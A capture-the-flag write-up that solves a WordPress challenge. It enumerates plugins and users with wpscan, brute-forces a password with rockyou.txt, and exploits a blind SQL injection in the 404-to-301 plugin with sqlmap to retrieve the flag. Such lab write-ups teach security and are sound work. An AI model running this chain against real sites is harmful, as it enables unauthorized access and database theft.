# How to solve it?

Solution is quite simple. There is wordpress plugin vulnerable to SQLi.

1. Detect vulnerable plugin:
```
$ docker run -it --rm --network host \
    wpscanteam/wpscan --url http://URL --api-token WP_API_TOKEN --plugins-detection aggressive -t 1

[i] Plugin(s) Identified:

[+] 404-to-301
 | Location: http://localhost:18000/wp-content/plugins/404-to-301/
 | Last Updated: 2022-02-09T16:02:00.000Z
 | Readme: http://localhost:18000/wp-content/plugins/404-to-301/readme.txt
 | [!] The version is out of date, the latest version is 3.1.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://localhost:18000/wp-content/plugins/404-to-301/, status: 200
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: 404 to 301 <= 2.0.2 - Authenticated Blind SQL Injection
 |     Fixed in: 2.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/61586816-dd2b-461d-975f-1989502affd9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9323
 |      - http://cinu.pl/research/wp-plugins/mail_e28f19a8f03f0517f94cb9fea15d8525.html
 |      - http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html
```

2. Extract usernames:
```
$ docker run -it --rm --network host \
    wpscanteam/wpscan --url http://URL -e u -t 1

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] user
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

3. Brute force password for user `user`:
```
$ docker run -it --rm --network host -v rockyou.txt:/tmp/rockyou.txt \
    wpscanteam/wpscan --url http://localhost:18000 -U user -P /tmp/rockyou.txt -t 1

[!] Valid Combinations Found:
 | Username: user, Password: password2
```

4. Generate SQLmap entry:
```
$ python3 exploit.py -T URL -P 80 -u user -p password2

[+] Payload for sqlmap exploitation:

sqlmap -u 'http://URL/wp-admin/admin.php?page=i4t3-logs&orderby=1' --level 2 --risk 2 --cookie='REDACTED' -p orderby -v1 --users --dbms=mysql --test-skip='MySQL >=? 5' --flush-session
```

5. Extract database users and flag:
```
$ sqlmap -u 'http://URL/wp-admin/admin.php?page=i4t3-logs&orderby=1' --level 2 --risk 2 --cookie='REDACTED' -p orderby -v1 --users --dbms=mysql --test-skip='MySQL >=? 5' --flush-session

[INFO] retrieved: 'BtSCTF{w0rdpr355_n07_50_53cur3_4f73r_4ll}'@'localhost'
```